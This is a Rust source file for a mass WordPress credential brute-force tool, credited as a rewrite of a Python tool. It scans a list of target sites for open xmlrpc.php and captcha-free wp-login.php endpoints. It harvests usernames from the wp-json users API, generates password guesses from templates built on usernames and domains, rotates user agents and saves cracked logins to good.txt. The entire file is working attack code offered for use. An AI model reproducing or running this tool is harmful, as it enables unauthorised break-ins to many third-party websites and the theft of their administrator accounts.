/*
 * XML-RPC && WP-Login Brute Force Use Custom SSL
 * Original Python version by t.me/@GrazzMean | https://github.com/fooster1337
 * Rust rewrite — edit as much as you like but don't forget to give credit.
 */

use colored::*;
use rand::seq::SliceRandom;
use regex::Regex;
use reqwest::header::{CONTENT_TYPE, USER_AGENT};
use reqwest::{Client, Identity};
use std::fs;
use std::io::{self, BufRead, Write};
use std::net::ToSocketAddrs;
use std::path::Path;
use std::sync::Arc;
use tokio::fs::OpenOptions;
use tokio::io::AsyncWriteExt;
use tokio::net::TcpStream;
use tokio::sync::Semaphore;
use tokio::time::{timeout, Duration};
use url::Url;

// ─── Banner ───────────────────────────────────────────────────────────────────

const BANNER: &str = r#"
  _                _        
 | |              | |       
 | |__  _ __ _   _| |_ ___  
 | '_ \| '__| | | | __/ _ \ 
 | |_) | |  | |_| | ||  __/ 
 |_.__/|_|   \__,_|\__\___| 
                             
"#;

// ─── User-Agent Pool ─────────────────────────────────────────────────────────

fn load_user_agents() -> Vec<String> {
    let path = "Files/user-agent.txt";
    match fs::read_to_string(path) {
        Ok(content) => content
            .lines()
            .filter(|l| !l.trim().is_empty())
            .map(|l| l.to_string())
            .collect(),
        Err(_) => vec![
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36".to_string()
        ],
    }
}

fn random_user_agent(agents: &[String]) -> String {
    agents
        .choose(&mut rand::thread_rng())
        .cloned()
        .unwrap_or_else(|| {
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36".to_string()
        })
}

// ─── Password Loader ─────────────────────────────────────────────────────────

fn load_passwords(path: &str) -> String {
    fs::read_to_string(path).unwrap_or_else(|e| {
        eprintln!("{}", format!("Failed to load password list '{}': {}", path, e).red());
        std::process::exit(1);
    })
}

// ─── TCP Port Check ──────────────────────────────────────────────────────────

async fn create_socket(host: &str, port: u16) -> bool {
    let addr = format!("{}:{}", host, port);
    match addr.to_socket_addrs() {
        Ok(mut addrs) => {
            if let Some(addr) = addrs.next() {
                timeout(Duration::from_secs(10), TcpStream::connect(addr))
                    .await
                    .map(|r| r.is_ok())
                    .unwrap_or(false)
            } else {
                false
            }
        }
        Err(_) => false,
    }
}

async fn check_port(host: &str) -> Option<String> {
    // Strip any existing scheme
    let clean = host
        .replace("http://", "")
        .replace("https://", "");
    let netloc = clean.split('/').next().unwrap_or(&clean);

    if create_socket(netloc, 443).await {
        Some("https".to_string())
    } else if create_socket(netloc, 80).await {
        Some("http".to_string())
    } else {
        None
    }
}

// ─── URL Parsing ─────────────────────────────────────────────────────────────

async fn parse_url(raw: &str) -> Option<String> {
    let stripped = raw
        .trim()
        .replace("http://", "")
        .replace("https://", "");

    let scheme = check_port(&stripped).await?;
    let full = format!("{}://{}", scheme, stripped);

    match Url::parse(&full) {
        Ok(parsed) => {
            let mut clean = format!(
                "{}://{}{}",
                parsed.scheme(),
                parsed.host_str().unwrap_or(""),
                parsed.path()
            );
            // Add port if non-standard
            if let Some(port) = parsed.port() {
                clean = format!(
                    "{}://{}:{}{}",
                    parsed.scheme(),
                    parsed.host_str().unwrap_or(""),
                    port,
                    parsed.path()
                );
            }
            // Remove trailing slash
            if clean.ends_with('/') {
                clean.pop();
            }
            Some(clean)
        }
        Err(_) => None,
    }
}

// ─── File Saver (thread-safe) ────────────────────────────────────────────────

async fn save_content(path: &str, content: &str) {
    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(path)
        .await
        .unwrap_or_else(|e| {
            eprintln!("Failed to open {}: {}", path, e);
            std::process::exit(1);
        });
    let _ = file.write_all(format!("{}\n", content).as_bytes()).await;
}

// ─── Build reqwest Client ────────────────────────────────────────────────────

fn build_client() -> Client {
    let cert_path = "Files/cert.pem";
    let key_path = "Files/key.pem";

    let base_builder = || {
        Client::builder()
            .danger_accept_invalid_certs(true)
            .timeout(Duration::from_secs(10))
            .cookie_store(true)
            .redirect(reqwest::redirect::Policy::limited(10))
    };

    // Try loading custom SSL identity if cert files exist
    if Path::new(cert_path).exists() && Path::new(key_path).exists() {
        let cert_pem = fs::read(cert_path).unwrap_or_default();
        let key_pem = fs::read(key_path).unwrap_or_default();

        match Identity::from_pkcs8_pem(&cert_pem, &key_pem) {
            Ok(identity) => {
                match base_builder().identity(identity).build() {
                    Ok(client) => {
                        eprintln!(
                            "{}",
                            "[*] Loaded custom SSL identity (cert.pem + key.pem)".green()
                        );
                        return client;
                    }
                    Err(e) => {
                        eprintln!(
                            "{}",
                            format!("Warning: Could not build client with SSL identity: {:?}. Falling back to no identity.", e).yellow()
                        );
                    }
                }
            }
            Err(e) => {
                eprintln!(
                    "{}",
                    format!("Warning: Could not parse SSL identity: {:?}. Falling back to no identity.", e).yellow()
                );
            }
        }
    }

    // Fallback: build without identity
    base_builder().build().unwrap_or_else(|e| {
        eprintln!("{}", format!("Failed to build HTTP client: {:?}", e).red());
        std::process::exit(1);
    })
}

// ─── Brute Struct ────────────────────────────────────────────────────────────

struct Brute {
    url: String,
    thread_count: usize,
    user_agents: Arc<Vec<String>>,
    password_template: String,
    client: Client,
    xmlrpc_lean: bool,
    wplogin_lean: bool,
}

impl Brute {
    fn new(url: String, thread_count: usize, user_agents: Arc<Vec<String>>, password_template: String) -> Self {
        Self {
            url,
            thread_count,
            user_agents,
            password_template,
            client: build_client(),
            xmlrpc_lean: false,
            wplogin_lean: false,
        }
    }

    fn vuln(&self, msg: &str) {
        println!(
            "[{}] {} => {}",
            "#".green(),
            self.url,
            msg.green()
        );
    }

    fn failed(&self, msg: &str) {
        println!(
            "[{}] {} => {}",
            "#".red(),
            self.url,
            msg.red()
        );
    }

    fn ua(&self) -> String {
        random_user_agent(&self.user_agents)
    }

    // ── Username Enumeration ─────────────────────────────────────────────

    async fn search_username(&self) -> Vec<String> {
        let endpoint = format!("{}/wp-json/wp/v2/users", self.url);
        let res = self
            .client
            .get(&endpoint)
            .header(USER_AGENT, self.ua())
            .header("Accept-Language", "en-US,en;q=0.5")
            .timeout(Duration::from_secs(10))
            .send()
            .await;

        match res {
            Ok(resp) => {
                let text = resp.text().await.unwrap_or_default();
                if text.contains("slug") {
                    let re = Regex::new(r#""slug":"([^"]+)""#).unwrap();
                    let usernames: Vec<String> = re
                        .captures_iter(&text)
                        .filter_map(|cap| cap.get(1).map(|m| m.as_str().to_string()))
                        .collect();
                    if usernames.is_empty() {
                        self.failed("Cannot_Grab_Username");
                    }
                    usernames
                } else {
                    self.failed("No_Username");
                    vec![]
                }
            }
            Err(e) => {
                if e.is_timeout() {
                    self.failed("Timeout");
                } else {
                    self.failed(&format!("{}", e));
                }
                vec![]
            }
        }
    }

    // ── Password Generation ──────────────────────────────────────────────

    fn set_password(&self, username: &str) -> Vec<String> {
        let parsed = Url::parse(&self.url).ok();
        let domain = parsed
            .as_ref()
            .and_then(|u| u.host_str())
            .unwrap_or("");

        let pw = self
            .password_template
            .replace("[UPPERLOGIN]", &username.to_uppercase())
            .replace("[WPLOGIN]", username)
            .replace("[DOMAIN]", domain)
            .replace("[UPPERDOMAIN]", &self.url.to_uppercase())
            .replace("[FULLDOMAIN]", &self.url);

        pw.lines()
            .filter(|l| !l.is_empty())
            .map(|l| l.to_string())
            .collect()
    }

    // ── XML-RPC Vulnerability Check ──────────────────────────────────────

    async fn is_vuln_xmlrpc(&self) -> bool {
        let endpoint = format!("{}/xmlrpc.php", self.url);

        let res = self
            .client
            .get(&endpoint)
            .header(USER_AGENT, self.ua())
            .timeout(Duration::from_secs(10))
            .send()
            .await;

        match res {
            Ok(resp) => {
                let text = resp.text().await.unwrap_or_default();
                if text.contains("XML-RPC server accepts POST requests only.") {
                    // Verify wp.getUsersBlogs is available
                    let payload = r#"<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"#;
                    let post_res = self
                        .client
                        .post(&endpoint)
                        .header(CONTENT_TYPE, "text/xml")
                        .header(USER_AGENT, self.ua())
                        .timeout(Duration::from_secs(5))
                        .body(payload)
                        .send()
                        .await;

                    match post_res {
                        Ok(post_resp) => {
                            let post_text = post_resp.text().await.unwrap_or_default();
                            if post_text.contains("wp.getUsersBlogs") {
                                self.vuln("Vuln_Xmlrpc");
                                return true;
                            }
                        }
                        Err(_) => {}
                    }
                }
                self.failed("Xmlrpc");
                false
            }
            Err(e) => {
                if e.is_timeout() {
                    self.failed("Timeout");
                } else {
                    self.failed(&format!("{}", e));
                }
                false
            }
        }
    }

    // ── WP-Login Vulnerability Check ─────────────────────────────────────

    async fn is_vuln_wp_login(&self) -> bool {
        let endpoint = format!("{}/wp-login.php", self.url);

        let res = self
            .client
            .get(&endpoint)
            .header(USER_AGENT, self.ua())
            .timeout(Duration::from_secs(10))
            .send()
            .await;

        match res {
            Ok(resp) => {
                let text = resp.text().await.unwrap_or_default();
                if text.contains("user_login") && !text.contains("captcha") {
                    self.vuln("WpLogin");
                    true
                } else {
                    self.failed("WpLogin_Not_Vuln");
                    false
                }
            }
            Err(e) => {
                if e.is_timeout() {
                    self.failed("Timeout");
                } else {
                    self.failed(&format!("{}", e));
                }
                false
            }
        }
    }

    // ── Get Cookies (session init) ───────────────────────────────────────

    async fn get_cookies(&self) -> bool {
        self.client
            .get(&self.url)
            .header(USER_AGENT, self.ua())
            .send()
            .await
            .is_ok()
    }

    // ── XML-RPC Brute Force ──────────────────────────────────────────────

    async fn brute_xmlrpc(&self, username: &str, passwords: &[String]) -> bool {
        let endpoint = format!("{}/xmlrpc.php", self.url);
        let ua = self.ua();

        for password in passwords {
            let payload = format!(
                r#"<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{}</value></param><param><value>{}</value></param></params></methodCall>"#,
                username, password
            );

            let res = self
                .client
                .post(&endpoint)
                .header(CONTENT_TYPE, "text/xml")
                .header(USER_AGENT, &ua)
                .timeout(Duration::from_secs(10))
                .body(payload)
                .send()
                .await;

            match res {
                Ok(resp) => {
                    let text = resp.text().await.unwrap_or_default();
                    if text.contains("<member><name>isAdmin</name><value>") {
                        println!(
                            "[{}] {} => {}",
                            "XMLRPC".yellow(),
                            self.url,
                            format!("{}|{}", username, password).green()
                        );
                        save_content(
                            "good.txt",
                            &format!("{}/wp-login.php#{}@{}", self.url, username, password),
                        )
                        .await;
                        return true;
                    } else {
                        println!(
                            "[{}] {} => {}",
                            "XMLRPC".yellow(),
                            self.url,
                            format!("{}|{}", username, password).red()
                        );
                    }
                }
                Err(e) => {
                    if e.is_timeout() {
                        self.failed("Timeout");
                    } else {
                        self.failed(&format!("{}", e));
                    }
                    tokio::time::sleep(Duration::from_secs(3)).await;
                }
            }
        }
        false
    }

    // ── WP-Login Brute Force ─────────────────────────────────────────────

    async fn brute_wp_login(&self, username: &str, passwords: &[String]) -> bool {
        let endpoint = format!("{}/wp-login.php", self.url);
        let ua = self.ua();

        for password in passwords {
            let params = [
                ("log", username.to_string()),
                ("pwd", password.clone()),
                ("wp-submit", "Log-In".to_string()),
                ("redirect_to", format!("{}/wp-admin/", self.url)),
                ("testcookie", "1".to_string()),
            ];

            let res = self
                .client
                .post(&endpoint)
                .header(USER_AGENT, &ua)
                .header(CONTENT_TYPE, "application/x-www-form-urlencoded")
                .form(&params)
                .timeout(Duration::from_secs(10))
                .send()
                .await;

            match res {
                Ok(resp) => {
                    let text = resp.text().await.unwrap_or_default();
                    if text.contains("/wp-admin/admin-ajax.php") || text.contains("dashboard") {
                        println!(
                            "[{}] {} => {}",
                            "WPLOGIN".blue(),
                            self.url,
                            format!("{}|{}", username, password).green()
                        );
                        save_content(
                            "good.txt",
                            &format!("{}/wp-login.php#{}@{}", self.url, username, password),
                        )
                        .await;
                        return true;
                    } else {
                        println!(
                            "[{}] {} => {}",
                            "WPLOGIN".blue(),
                            self.url,
                            format!("{}|{}", username, password).red()
                        );
                    }
                }
                Err(e) => {
                    if e.is_timeout() {
                        self.failed("Timeout");
                    } else {
                        self.failed(&format!("{}", e));
                    }
                }
            }
        }
        false
    }

    // ── Main Orchestration ───────────────────────────────────────────────

    async fn start(&mut self) {
        // Check vulnerabilities
        if self.is_vuln_xmlrpc().await {
            self.xmlrpc_lean = true;
        }
        if self.is_vuln_wp_login().await {
            if self.get_cookies().await {
                self.wplogin_lean = true;
            }
        }

        if !self.xmlrpc_lean && !self.wplogin_lean {
            return;
        }

        save_content("wordpress.txt", &self.url).await;

        let usernames = self.search_username().await;
        if usernames.is_empty() {
            return;
        }

        // Brute force with concurrency per user
        let semaphore = Arc::new(Semaphore::new(self.thread_count));

        for user in &usernames {
            let passwords = self.set_password(user);

            let mut handles = vec![];

            if self.xmlrpc_lean {
                let sem = semaphore.clone();
                let url = self.url.clone();
                let ua_pool = self.user_agents.clone();
                let user = user.clone();
                let passwords = passwords.clone();
                let pw_template = self.password_template.clone();

                handles.push(tokio::spawn(async move {
                    let _permit = sem.acquire().await.unwrap();
                    let brute = Brute::new(url, 1, ua_pool, pw_template);
                    brute.brute_xmlrpc(&user, &passwords).await
                }));
            }

            if self.wplogin_lean {
                let sem = semaphore.clone();
                let url = self.url.clone();
                let ua_pool = self.user_agents.clone();
                let user = user.clone();
                let passwords = passwords.clone();
                let pw_template = self.password_template.clone();

                handles.push(tokio::spawn(async move {
                    let _permit = sem.acquire().await.unwrap();
                    let brute = Brute::new(url, 1, ua_pool, pw_template);
                    brute.brute_wp_login(&user, &passwords).await
                }));
            }

            // Wait for all brute tasks for this user
            let mut found = false;
            for handle in handles {
                if let Ok(result) = handle.await {
                    if result {
                        found = true;
                    }
                }
            }

            if found {
                break;
            }
        }
    }
}

// ─── Main ────────────────────────────────────────────────────────────────────

#[tokio::main]
async fn main() {
    // Print banner
    println!("{}", BANNER.green());
    println!(
        "{} | {}",
        "XML-RPC".yellow(),
        "WP-LOGIN BRUTE FORCE".yellow()
    );
    println!("By @GrazzMean\n");

    // Load resources
    let user_agents = Arc::new(load_user_agents());

    // Interactive input
    let stdin = io::stdin();

    print!("- List : ");
    io::stdout().flush().unwrap();
    let mut list_path = String::new();
    stdin.lock().read_line(&mut list_path).unwrap();
    let list_path = list_path.trim().to_string();

    print!("- Password List [default: top-830_MCR.txt] : ");
    io::stdout().flush().unwrap();
    let mut pw_path = String::new();
    stdin.lock().read_line(&mut pw_path).unwrap();
    let pw_path = pw_path.trim();
    let pw_path = if pw_path.is_empty() {
        "top-830_MCR.txt"
    } else {
        pw_path
    };

    print!("- Thread : ");
    io::stdout().flush().unwrap();
    let mut thread_input = String::new();
    stdin.lock().read_line(&mut thread_input).unwrap();
    let thread_count: usize = thread_input.trim().parse().unwrap_or(10);

    // Load password template
    let password_template = load_passwords(pw_path);

    // Load URL list (deduplicated, preserving order)
    let urls: Vec<String> = match fs::read_to_string(list_path) {
        Ok(content) => {
            let mut seen = std::collections::HashSet::new();
            content
                .lines()
                .filter(|l| !l.trim().is_empty())
                .filter(|l| seen.insert(l.to_string()))
                .map(|l| l.to_string())
                .collect()
        }
        Err(e) => {
            eprintln!("{}", format!("Failed to read list file: {}", e).red());
            return;
        }
    };

    println!(
        "\n{} Loaded {} URLs with {} threads\n",
        "[*]".green(),
        urls.len(),
        thread_count
    );

    // Process URLs with bounded concurrency
    let semaphore = Arc::new(Semaphore::new(thread_count));
    let mut handles = vec![];

    for raw_url in urls {
        let sem = semaphore.clone();
        let ua_pool = user_agents.clone();
        let pw_template = password_template.clone();
        let thread_count = thread_count;

        handles.push(tokio::spawn(async move {
            let _permit = sem.acquire().await.unwrap();

            match parse_url(&raw_url).await {
                Some(url) => {
                    let mut brute = Brute::new(url, thread_count, ua_pool, pw_template);
                    brute.start().await;
                }
                None => {
                    println!(
                        "[{}] {} => {}",
                        "#".red(),
                        raw_url,
                        "Die Website".red()
                    );
                }
            }
        }));
    }

    // Wait for all tasks
    for handle in handles {
        let _ = handle.await;
    }
}
